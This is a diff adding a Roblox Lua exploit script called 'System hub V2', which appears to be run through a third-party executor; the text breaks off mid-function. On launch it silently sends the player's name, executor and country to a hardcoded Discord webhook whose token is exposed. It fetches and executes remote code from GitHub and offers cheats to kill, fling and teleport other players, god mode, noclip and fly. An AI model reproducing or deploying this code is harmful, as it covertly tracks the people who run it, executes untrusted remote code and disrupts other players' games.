@@ -1,0 +1,4677 @@
+local webhook = "https://discord.com/api/webhooks/1227230029679955979/R6l0Z5T1c0XF8zoFU7zCo8EZzA_7Y7EQWaXUEGoHkThwMnVLLI0Uyu5PGk1QaUxrXPVy"
+
+local data = {
+  ["content"] = "",
+  ["embeds"] = {
+    {
+      ["title"] = " استخدم السكربت " .. game.Players.LocalPlayer.Name,
+      ["description"] = " الهاك  "..identifyexecutor().."  الدوله   "..game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer),
+    }
+  }
+}
+
+local HttpService = game:GetService("HttpService")
+local HS = HttpService:JSONEncode(data)
+local headers = {
+  ["content-type"] = "application/json"
+}
+
+local request = http_request or request or HttpPost or syn.request
+
+local data2 = {
+  Url = webhook, Body = HS, Method = "POST", Headers = headers
+}
+
+request(data2)
+
+if not game:IsLoaded() then
+  game:IsLoaded():Wait()
+end
+
+local speaker = game.Players.LocalPlayer
+local plr = game.Players.LocalPlayer
+local playerlp = plr
+local Characterlp = plr.Character
+local Area = game:GetService("Workspace")
+local players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UIS = game:GetService("UserInputService")
+local coregui = game:GetService("CoreGui")
+local Mouse = plr:GetMouse()
+local MyView = Area.CurrentCamera
+local MyTeamColor = plr.TeamColor
+local HoldingM2 = false
+local Active = false
+local Lock = false
+local Epitaph = .187 
+local HeadOffset = Vector3.new(0, .1, 0)
+Players = game:GetService("Players")
+IYMouse = Players.LocalPlayer:GetMouse()
+UserInputService = game:GetService("UserInputService")
+autoclicking = false
+local WalkTo = false
+local Guarding = false
+local Flinging = false
+local Platformstand = false
+local viewing = nil
+local Control = false
+local Lagging = false
+local AutoObby = false
+local invisRunning = false
+local IsInvis = false
+local IsRunning = true
+local invisFix
+local invisDied
+local InvisibleCharacter
+local CF
+local Clip = true
+local Regulars = false
+local vnoclipParts = {}
+local FlingTBL = {}
+local frozenParts = {}
+local vfreeze = {}
+local RestoreCFling = {}
+local shownParts = {}
+local showninParts = {}
+local showninvParts = {}
+local shownvisParts = {}
+local vstrongParts = {}
+local vweakParts = {}
+local highlights = {}
+local workspace = game.Workspace
+local Noclipping = nil
+local viewDied
+local viewChanged
+local triggermd
+local triggermp
+local cancelAutoClick
+local highlight
+local highlight2
+local closesttouch = nil
+local closestclick = nil
+local closestprox = nil
+local closestseat = nil
+local lockcursorman
+local unlockcursorman
+local fakekicktbl
+CFloop = nil
+CFspeed = 50
+simRadius = false
+FLYING = false
+QEfly = true
+NOWW = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").WalkSpeed
+NOWJ = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").JumpPower
+NOWG = game.Workspace.Gravity
+NOWH = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").HipHeight
+iyflyspeed = 1
+PlayerVolumeBELIKE = UserSettings():GetService("UserGameSettings").MasterVolume
+PlayerGraphicsBELIKE = settings().Rendering.QualityLevel
+vehicleflyspeed = 1
+local HumanModCons = {}
+local flyjump
+local simRadLoop
+local stareLoop
+local currentToolSize = ""
+local currentGripPos = ""
+local invisRunning = false
+local noSit
+local nositDied
+local proxDied = nil
+local clickDied = nil
+local selclick = nil
+local seltouch = nil
+local selprox = nil
+local selseat = nil
+local selinvisp = nil
+local selcanc = nil
+local YesRefresh = false
+local sethidden = sethiddenproperty or set_hidden_property or set_hidden_prop
+local setsimulation = setsimulationradius or set_simulation_radius
+
+function round(num, numDecimalPlaces)
+  local mult = 10 ^ (numDecimalPlaces or 0)
+  return math.floor(num * mult + 0.5) / mult
+end
+
+function getRoot(char)
+  local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or
+      char:FindFirstChild('UpperTorso')
+  return rootPart
+end
+
+function SimRad()
+  if sethidden then
+    simRadLoop = game:GetService('RunService').Stepped:Connect(function()
+      if setsimulation then
+        setsimulation(1e308, 1 / 0)
+      else
+        sethidden(plr, "MaximumSimulationRadius", 1 / 0)
+        sethidden(plr, "SimulationRadius", 1e308)
+      end
+    end)
+    simRadius = true
+  end
+end
+
+function toClipboard(String)
+  local clipBoard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
+  if clipBoard then
+    clipBoard(String)
+  end
+end
+
+local function CursorLock()
+  UIS.MouseBehavior = Enum.MouseBehavior.LockCenter
+end
+
+local function UnLockCursor()
+  HoldingM2 = false
+  Active = false
+  Lock = false
+  UIS.MouseBehavior = Enum.MouseBehavior.Default
+end
+
+function FindNearestPlayer()
+  local dist = math.huge
+  local Target = nil
+  for _, v in pairs(game.Players:GetPlayers()) do
+    if v ~= plr and v.Character:FindFirstChildOfClass("Humanoid") and
+        v.Character:FindFirstChildOfClass("Humanoid").Health > 0 and getRoot(v.Character) and v then
+      local TheirCharacter = v.Character
+      local CharacterRoot, Visible = MyView:WorldToViewportPoint(getRoot(TheirCharacter).Position)
+      if Visible then
+        local RealMag = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(CharacterRoot.X, CharacterRoot.Y)).Magnitude
+        if RealMag < dist and RealMag < FOVCircle.Radius then
+          dist = RealMag
+          Target = TheirCharacter
+        end
+      end
+    end
+  end
+  return Target
+end
+
+function Noclip()
+  Clip = false
+  function NoclipLoop()
+    if Clip == false and plr.Character ~= nil then
+      for _, child in pairs(plr.Character:GetDescendants()) do
+        if child:IsA("BasePart") and child.CanCollide == true then
+          child.CanCollide = false
+        end
+      end
+    end
+  end
+
+  Noclipping = game:GetService('RunService').Stepped:connect(NoclipLoop)
+end
+
+function TurnsVisible()
+  if IsInvis == false then return end
+  invisFix:Disconnect()
+  invisDied:Disconnect()
+  CF = game.Workspace.CurrentCamera.CFrame
+  Characterlp = Characterlp
+  local CF_1 = playerlp.Character.HumanoidRootPart.CFrame
+  Characterlp.HumanoidRootPart.CFrame = CF_1
+  InvisibleCharacter:Destroy()
+  playerlp.Character = Characterlp
+  Characterlp.Parent = workspace
+  IsInvis = false
+  playerlp.Character.Animate.Disabled = true
+  playerlp.Character.Animate.Disabled = false
+  invisDied = Characterlp:FindFirstChildOfClass 'Humanoid'.Died:Connect(function()
+    invisRespawn()
+    invisDied:Disconnect()
+  end)
+  invisRunning = false
+end
+
+function invisRespawn()
+  IsRunning = false
+  if IsInvis == true then
+    pcall(function()
+      playerlp.Character = Characterlp
+      wait()
+      Characterlp.Parent = game.Workspace
+      Characterlp:FindFirstChildWhichIsA 'Humanoid':Destroy()
+      IsInvis = false
+      InvisibleCharacter.Parent = nil
+      invisRunning = false
+    end)
+  elseif IsInvis == false then
+    pcall(function()
+      playerlp.Character = Characterlp
+      wait()
+      Characterlp.Parent = game.Workspace
+      Characterlp:FindFirstChildWhichIsA 'Humanoid':Destroy()
+      TurnsVisible()
+    end)
+  end
+end
+
+function TurnVisible()
+  if IsInvis == false then return end
+  invisFix:Disconnect()
+  invisDied:Disconnect()
+  CF = game.Workspace.CurrentCamera.CFrame
+  Characterlp = Characterlp
+  local CF_1 = playerlp.Character.HumanoidRootPart.CFrame
+  Characterlp.HumanoidRootPart.CFrame = CF_1
+  InvisibleCharacter:Destroy()
+  playerlp.Character = Characterlp
+  Characterlp.Parent = workspace
+  IsInvis = false
+  playerlp.Character.Animate.Disabled = true
+  playerlp.Character.Animate.Disabled = false
+  invisDied = Characterlp:FindFirstChildOfClass 'Humanoid'.Died:Connect(function()
+    invisRespawn()
+    invisDied:Disconnect()
+  end)
+  invisRunning = false
+end
+
+function fixcam()
+  game.Workspace.CurrentCamera:Remove()
+  wait(.1)
+  repeat wait() until plr.Character ~= nil
+  game.Workspace.CurrentCamera.CameraSubject = plr.Character:FindFirstChildWhichIsA('Humanoid')
+  game.Workspace.CurrentCamera.CameraType = "Custom"
+  plr.CameraMinZoomDistance = 0.5
+  plr.CameraMaxZoomDistance = 400
+  plr.CameraMode = "Classic"
+  plr.Character.Head.Anchored = false
+end
+
+function respawn(plr)
+  if invisRunning then TurnVisible() end
+  local char = plr.Character
+  if char:FindFirstChildOfClass("Humanoid") then char:FindFirstChildOfClass("Humanoid"):ChangeState(15) end
+  char:ClearAllChildren()
+  local newChar = Instance.new("Model")
+  newChar.Parent = workspace
+  plr.Character = newChar
+  wait()
+  plr.Character = char
+  newChar:Destroy()
+end
+
+function refresh(plr)
+  local Human = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid", true)
+  local pos = Human and Human.RootPart and Human.RootPart.CFrame
+  local pos1 = game.Workspace.CurrentCamera.CFrame
+  respawn(plr)
+  task.spawn(function()
+    speaker.CharacterAdded:Wait():WaitForChild("Humanoid").RootPart.CFrame, workspace.CurrentCamera.CFrame = pos,
+        wait() and pos1
+  end)
+end
+
+function tools(plr)
+  if plr:FindFirstChildOfClass("Backpack"):FindFirstChildOfClass('Tool') or plr.Character:FindFirstChildOfClass('Tool') then
+    return true
+  end
+end
+
+function attach(speaker, target)
+  if tools(speaker) then
+    local char = speaker.Character
+    local tchar = target.Character
+    local hum = speaker.Character:FindFirstChildOfClass("Humanoid")
+    local hrp = getRoot(speaker.Character)
+    local hrp2 = getRoot(target.Character)
+    hum.Name = "1"
+    local newHum = hum:Clone()
+    newHum.Parent = char
+    newHum.Name = "Humanoid"
+    wait()
+    hum:Destroy()
+    game.Workspace.CurrentCamera.CameraSubject = char
+    newHum.DisplayDistanceType = "None"
+    local tool = speaker:FindFirstChildOfClass("Backpack"):FindFirstChildOfClass("Tool") or
+        speaker.Character:FindFirstChildOfClass("Tool")
+    tool.Parent = char
+    hrp.CFrame = hrp2.CFrame * CFrame.new(0, 0, 0) *
+        CFrame.new(math.random(-100, 100) / 200, math.random(-100, 100) / 200, math.random(-100, 100) / 200)
+    local n = 0
+    repeat
+      wait(.1)
+      n = n + 1
+      hrp.CFrame = hrp2.CFrame
+    until (tool.Parent ~= char or not hrp or not hrp2 or not hrp.Parent or not hrp2.Parent or n > 250) and n > 2
+  else
+    game.StarterGui:SetCore("SendNotification",
+      { Title = "Warning!", Text = "You need to have an item in backpack to execute this script.", Duration = 4, })
+  end
+end
+
+function bring(speaker, target, fast)
+  if tools(speaker) then
+    if target ~= nil then
+      local NormPos = getRoot(speaker.Character).CFrame
+      if not fast then
+        refresh(speaker)
+        wait()
+        repeat wait() until speaker.Character ~= nil and getRoot(speaker.Character)
+        wait(0.3)
+      end
+      local hrp = getRoot(speaker.Character)
+      attach(speaker, target)
+      repeat
+        wait()
+        hrp.CFrame = NormPos
+      until not getRoot(target.Character) or not getRoot(speaker.Character)
+      wait(1)
+      plr.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
+    end
+  else
+    game.StarterGui:SetCore("SendNotification",
+      { Title = "Warning!", Text = "You need to have an item in backpack to execute this script.", Duration = 4, })
+  end
+end
+
+function kill(speaker, target, fast)
+  if tools(speaker) then
+    if target ~= nil then
+      local NormPos = getRoot(speaker.Character).CFrame
+      if not fast then
+        refresh(speaker)
+        wait()
+        repeat wait() until speaker.Character ~= nil and getRoot(speaker.Character)
+        wait(0.3)
+      end
+      local hrp = getRoot(speaker.Character)
+      attach(speaker, target)
+      repeat
+        wait()
+        hrp.CFrame = CFrame.new(999999, workspace.FallenPartsDestroyHeight + 5, 999999)
+      until not getRoot(target.Character) or not getRoot(speaker.Character)
+      wait(1)
+      speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
+    end
+  else
+    game.StarterGui:SetCore("SendNotification",
+      { Title = "Warning!", Text = "You need to have an item in backpack to execute this script.", Duration = 4, })
+  end
+end
+
+function teleport(speaker, target, target2, fast)
+  if tools(speaker) then
+    if target ~= nil then
+      local NormPos = getRoot(speaker.Character).CFrame
+      if not fast then
+        refresh(speaker)
+        wait()
+        repeat wait() until speaker.Character ~= nil and getRoot(speaker.Character)
+        wait(0.3)
+      end
+      local hrp = getRoot(speaker.Character)
+      local hrp2 = getRoot(target2.Character)
+      attach(speaker, target)
+      repeat
+        wait()
+        hrp.CFrame = hrp2.CFrame
+      until not getRoot(target.Character) or not getRoot(speaker.Character)
+      wait(1)
+      speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
+    end
+  else
+    game.StarterGui:SetCore("SendNotification",
+      { Title = "Warning!", Text = "You need to have an item in backpack to execute this script.", Duration = 4, })
+  end
+end
+
+function GetPlayer(String)
+  local Foundplr = {}
+  local strl = String:lower()
+  if strl == "all" then
+    for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+      table.insert(Foundplr, v)
+    end
+  elseif strl == "random" then
+    for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+      if v.Name ~= plr.Name then
+        table.insert(Foundplr, v)
+      end
+    end
+  elseif strl == "me" then
+    for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+      if v.Name == plr.Name then
+        table.insert(Foundplr, v)
+      end
+    end
+  else
+    for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+      if v.DisplayName:lower():sub(1, #String) == String:lower() or v.Name:lower():sub(1, #String) == String:lower() then
+        table.insert(Foundplr, v)
+      end
+    end
+  end
+  return Foundplr
+end
+
+function GetNPC(String)
+  local FoundNPC = {}
+  local strl = String:lower()
+  for i, v in pairs(game.Workspace:GetDescendants()) do do
+      if v:IsA("Model") and v.Name:lower():sub(1, #String) == String:lower() then
+        table.insert(FoundNPC, v)
+      end
+    end
+  end
+  return FoundNPC
+end
+
+local function align(part0, part1)
+  local attachment0 = Instance.new("Attachment", part1)
+  local attachment1 = Instance.new("Attachment", part0)
+
+  local alignpos = Instance.new("AlignPosition", part0)
+  alignpos.MaxForce = math.huge
+  alignpos.Responsiveness = 200
+  alignpos.Attachment0 = attachment0
+  alignpos.Attachment1 = attachment1
+end
+
+local function fling(part0)
+  local vel = Instance.new("BodyAngularVelocity", part0)
+  vel.AngularVelocity = Vector3.new(1, 1, 1) * 999
+  vel.MaxTorque = Vector3.new(1, 1, 1) * 9999
+end
+
+local function loadcharacter(character)
+  local scf = character.HumanoidRootPart.CFrame
+  character.HumanoidRootPart.CFrame = scf * CFrame.new(0, 100, 0)
+  character.HumanoidRootPart.Anchored = true
+
+  wait(1)
+
+  local fakec = Instance.new("Model", workspace)
+
+  local froot = Instance.new("Part", fakec)
+  froot.Name = "HumanoidRootPart"
+  froot.Size = Vector3.new(1, 5, 1)
+  froot.CFrame = scf
+  froot.Transparency = 0.5
+
+  Instance.new("Humanoid", fakec)
+
+  plr.Character = fakec
+  workspace.CurrentCamera.CameraSubject = fakec.Humanoid
+
+  align(froot, character.HumanoidRootPart)
+
+  character.Humanoid:Destroy()
+
+  for _, p in pairs(character:GetDescendants()) do
+    if p:IsA("BasePart") then
+      p.CanCollide = false
+      p.Massless = true
+    elseif p:IsA("BodyGyro") or p:IsA("BodyAngularVelocity") or p:IsA("BodyVelocity") then
+      p:Destroy()
+    end
+  end
+
+  game.RunService.Heartbeat:Connect(function()
+    for _, p in pairs(character:GetDescendants()) do
+      if p:IsA("BasePart") then
+        p.CanCollide = false
+        p.Massless = true
+        p.Anchored = false
+      elseif p:IsA("Weld") then
+        p.Enabled = false
+      end
+    end
+  end)
+
+
+  wait()
+
+  wait(1)
+  fling(character.HumanoidRootPart)
+end
+
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/thanhdat4461/OrionMoblie/main/source')))()
+
+OrionLib:MakeNotification({
+  Name = "Thanks for using System hub",
+  Content = "Made by AAAAA999l999",
+  Image = "rbxassetid://6026568227",
+  Time = 10
+})
+
+local Window = OrionLib:MakeWindow({
+  Name = "System hub V2",
+  HidePremium = false,
+  SaveConfig = true,
+  ConfigFolder = "",
+  IntroText = "Loading Script.."
+})
+
+local Tab = Window:MakeTab({
+  Name = "Main",
+  Icon = "rbxassetid://6026568227",
+  PremiumOnly = false
+})
+
+local placeId = game.PlaceId
+local placeInfo = game:GetService("MarketplaceService"):GetProductInfo(placeId)
+local placeName = placeInfo.Name
+
+
+Tab:AddParagraph("Welcome,"..game.Players.LocalPlayer.DisplayName,"@"..game.Players.LocalPlayer.Name)
+Tab:AddLabel("UserID "..game.Players.LocalPlayer.UserId)
+Tab:AddLabel("Executor "..identifyexecutor())
+Tab:AddLabel("Ping "..game.Players.LocalPlayer:GetNetworkPing() * (1000).." ms")
+Tab:AddLabel("Country "..game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer))
+Tab:AddLabel("Game Name "..placeName)
+
+local Tab = Window:MakeTab({
+  Name = "Player",
+  Icon = "rbxassetid://6023426915",
+  PremiumOnly = false
+})
+
+Tab:AddTextbox({
+  Name = "WalkSpeed",
+  Default = "",
+  TextDisappear = true,
+  Callback = function(txt)
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = txt
+  end	  
+})
+Tab:AddButton({
+  Name = "Reset WalkSpeed",
+  Callback = function()
+          game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
+    end    
+})
+Tab:AddTextbox({
+  Name = "JumpPower",
+  Default = "",
+  TextDisappear = true,
+  Callback = function(txt)
+    game.Players.LocalPlayer.Character.Humanoid.JumpPower = txt
+  end	  
+})
+Tab:AddButton({
+  Name = "Reset JumpPower",
+  Callback = function()
+          game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
+    end    
+})
+Tab:AddTextbox({
+  Name = "Gravity",
+  Default = "",
+  TextDisappear = true,
+  Callback = function(txt)
+    workspace.Gravity = txt
+  end	   
+})
+Tab:AddButton({
+  Name = "Reset Gravity",
+  Callback = function()
+          workspace.Gravity = 192.6
+    end    
+})
+Tab:AddTextbox({
+  Name = "Hipheight",
+  Default = "",
+  TextDisappear = true,
+  Callback = function(txt)
+    game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").HipHeight = txt
+  end	  
+})
+Tab:AddButton({
+  Name = "Reset Hipheight",
+  Callback = function()
+          game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").HipHeight = 1
+    end    
+})
+Tab:AddTextbox({
+  Name = "Fov",
+  Default = "",
+  TextDisappear = true,
+  Callback = function(txt)
+    game.Workspace.CurrentCamera.FieldOfView = txt
+  end	  
+})
+Tab:AddButton({
+  Name = "Reset Fov",
+  Callback = function()
+          game.Workspace.CurrentCamera.FieldOfView = 70
+    end    
+})
+Tab:AddButton({
+  Name = "Reset All",
+  Callback = function()
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
+      game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
+      workspace.Gravity = 192.6
+      game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").HipHeight = 1
+      game.Workspace.CurrentCamera.FieldOfView = 70
+    end   
+})
+Tab:AddLabel("Others")
+Tab:AddButton({
+  Name = "AntiAfk",
+  Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/KazeOnTop/Rice-Anti-Afk/main/Wind", true))()
+    end   
+})
+Tab:AddButton({
+  Name = "Reset",
+  Callback = function()
+          game.Players.LocalPlayer.Character.Head:Destroy()
+    end    
+})
+Tab:AddButton({
+  Name = "Rejoin",
+  Callback = function()
+        local plr = game.Players.LocalPlayer
+
+game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
+    end   
+})
+Tab:AddButton({
+  Name = "God Mode",
+  Callback = function()
+        local Cam = workspace.CurrentCamera
+  local Pos, Char = Cam.CFrame, game.Players.LocalPlayer.Character
+  local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
+  local nHuman = Human:Clone(Human)
+  nHuman.Parent, game.Players.LocalPlayer.Character = Char, nil
+  nHuman.SetStateEnabled(nHuman, 15, false)
+  nHuman.SetStateEnabled(nHuman, 1, false)
+  nHuman.SetStateEnabled(nHuman, 0, false)
+  nHuman.BreakJointsOnDeath, Human = true, Human.Destroy(Human)
+  game.Players.LocalPlayer.Character, Cam.CameraSubject, Cam.CFrame = Char, nHuman, wait() and Pos
+  nHuman.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
+  local Script = Char.FindFirstChild(Char, "Animate")
+  if Script then
+    Script.Disabled = true
+    wait()
+    Script.Disabled = false
+  end
+  nHuman.Health = nHuman.MaxHealth
+    end    
+})
+Tab:AddButton({
+  Name = "God Mode [Humanoid Replacer]",
+  Callback = function()
+        game.Players.LocalPlayer.Character.Humanoid.Name = 1
+local l = game.Players.LocalPlayer.Character["1"]:Clone()
+l.Parent = game.Players.LocalPlayer.Character
+l.Name = "Humanoid"
+wait(0.1)
+game.Players.LocalPlayer.Character["1"]:Destroy()
+game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
+game.Players.LocalPlayer.Character.Animate.Disabled = true
+wait(0.1)
+game.Players.LocalPlayer.Character.Animate.Disabled = false
+game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
+    end    
+})
+
+Tab:AddButton({
+  Name = "unAnchored Parts to You",
+  Callback = function()
+        if sethidden then
+      local Forces = {}
+      for _,part in pairs(game.Workspace:GetDescendants()) do
+        if game.Players.LocalPlayer.Character:FindFirstChild("Head") and part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and not part:IsDescendantOf(plr.Character) and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then
+          for i,c in pairs(part:GetChildren()) do
+            if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
+              c:Destroy()
+            end
+          end
+          local ForceInstance = Instance.new("BodyPosition")
+          ForceInstance.Parent = part
+          ForceInstance.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+          table.insert(Forces, ForceInstance)
+          if not table.find(frozenParts,part) then
+            table.insert(frozenParts,part)
+          end
+        end
+      end
+      if not simRadius then
+        SimRad()
+      end
+      for i,c in pairs(Forces) do
+        c.Position = plr.Character.Head.Position
+      end
+    end
+  end    
+})
+function sFLY(vfly)
+  repeat wait() until Players.LocalPlayer and Players.LocalPlayer.Character and Players.LocalPlayer.Character.HumanoidRootPart and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+  repeat wait() until IYMouse
+  if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end
+
+  local T = Players.LocalPlayer.Character.HumanoidRootPart
+  local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
+  local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
+  local SPEED = 0
+
+  local function FLY()
+    FLYING = true
+    local BG = Instance.new('BodyGyro')
+    local BV = Instance.new('BodyVelocity')
+    BG.P = 9e4
+    BG.Parent = T
+    BV.Parent = T
+    BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
+    BG.cframe = T.CFrame
+    BV.velocity = Vector3.new(0, 0, 0)
+    BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
+    task.spawn(function()
+      repeat wait()
+        if not vfly and Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
+          Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
+        end
+        if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
+          SPEED = 50
+        elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
+          SPEED = 0
+        end
+        if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
+          BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
+          lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
+        elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
+          BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
+        else
+          BV.velocity = Vector3.new(0, 0, 0)
+        end
+        BG.cframe = workspace.CurrentCamera.CoordinateFrame
+      until not FLYING
+      CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
+      lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
+      SPEED = 0
+      BG:Destroy()
+      BV:Destroy()
+      if Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
+        Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
+      end
+    end)
+  end
+  flyKeyDown = IYMouse.KeyDown:Connect(function(KEY)
+    if KEY:lower() == 'w' then
+      CONTROL.F = (vfly and vehicleflyspeed or iyflyspeed)
+    elseif KEY:lower() == 's' then
+      CONTROL.B = - (vfly and vehicleflyspeed or iyflyspeed)
+    elseif KEY:lower() == 'a' then
+      CONTROL.L = - (vfly and vehicleflyspeed or iyflyspeed)
+    elseif KEY:lower() == 'd' then 
+      CONTROL.R = (vfly and vehicleflyspeed or iyflyspeed)
+    elseif QEfly and KEY:lower() == 'e' then
+      CONTROL.Q = (vfly and vehicleflyspeed or iyflyspeed)*2
+    elseif QEfly and KEY:lower() == 'q' then
+      CONTROL.E = -(vfly and vehicleflyspeed or iyflyspeed)*2
+    end
+    pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Track end)
+  end)
+  flyKeyUp = IYMouse.KeyUp:Connect(function(KEY)
+    if KEY:lower() == 'w' then
+      CONTROL.F = 0
+    elseif KEY:lower() == 's' then
+      CONTROL.B = 0
+    elseif KEY:lower() == 'a' then
+      CONTROL.L = 0
+    elseif KEY:lower() == 'd' then
+      CONTROL.R = 0
+    elseif KEY:lower() == 'e' then
+      CONTROL.Q = 0
+    elseif KEY:lower() == 'q' then
+      CONTROL.E = 0
+    end
+  end)
+  FLY()
+end
+
+function NOFLY()
+  FLYING = false
+  if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end
+  if Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
+    Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
+  end
+  pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Custom end)
+end
+Tab:AddToggle({
+  Name = "Fly",
+  Default = false,
+  Callback = function(Fly)
+    if Fly == true then
+               NOFLY()
+  wait()
+  sFLY()
+          else
+               Fly = false
+               NOFLY()
+  end
+  end    
+})
+
+Tab:AddTextbox({
+  Name = "Fly Speed",
+  Default = "",
+  TextDisappear = true,
+  Callback = function(Flyspeed)
+    iyflyspeed = Flyspeed  
+    end	
+})
+
+Tab:AddToggle({
+  Name = "Mobile Fly",
+  Default = false,
+  Callback = function(cFly)
+    if cFly == true then
+               plr.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
+  local Head = plr.Character:WaitForChild("Head")
+  Head.Anchored = true
+  CFloop = game:GetService("RunService").Heartbeat:Connect(function(deltaTime)
+    local moveDirection = plr.Character:FindFirstChildOfClass('Humanoid').MoveDirection * (CFspeed * deltaTime)
+    local headCFrame = Head.CFrame
+    local cameraCFrame = game.Workspace.CurrentCamera.CFrame
+    local cameraOffset = headCFrame:ToObjectSpace(cameraCFrame).Position
+    cameraCFrame = cameraCFrame * CFrame.new(-cameraOffset.X, -cameraOffset.Y, -cameraOffset.Z + 1)
+    local cameraPosition = cameraCFrame.Position
+    local headPosition = headCFrame.Position
+
+    local objectSpaceVelocity = CFrame.new(cameraPosition, Vector3.new(headPosition.X, cameraPosition.Y, headPosition.Z)):VectorToObjectSpace(moveDirection)
+    Head.CFrame = CFrame.new(headPosition) * (cameraCFrame - cameraPosition) * CFrame.new(objectSpaceVelocity)
+  end)
+          else
+               cFly = false
+               if CFloop then
+    CFloop:Disconnect()
+    plr.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
+    local Head = plr.Character:WaitForChild("Head")
+    Head.Anchored = false
+  end
+  end
+  end    
+})
+
+Tab:AddTextbox({
+  Name = "Mobile Fly Speed",
+  Default = "",
+  TextDisappear = true,
+  Callback = function(cFlyspeed)
+    CFspeed = cFlyspeed
+  end	
+})
+
+Tab:AddToggle({
+  Name = "Fly Fling",
+  Default = false,
+  Callback = function(Fly)
+    if Fly == true then
+               NOFLY()
+  wait()
+    for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+    if v:IsA("Part") then
+
+v.CustomPhysicalProperties = PhysicalProperties.new(9e99, 9e99, 9e99, 9e99, 9e99)
+end
+end
+    Noclip()
+  sFLY(true)
+    local BodyAV = Instance.new("BodyAngularVelocity", game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart"))
+BodyAV.AngularVelocity = Vector3.new(0, 2000, 0)
+BodyAV.MaxTorque = Vector3.new(0, math.huge, 0)
+BodyAV.Name = "FlyFling"
+BodyAV.P = 1250
+          else
+               Fly = false
+               NOFLY()
+               for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+    if child.ClassName == "Part" then
+      child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5, 0, 0)
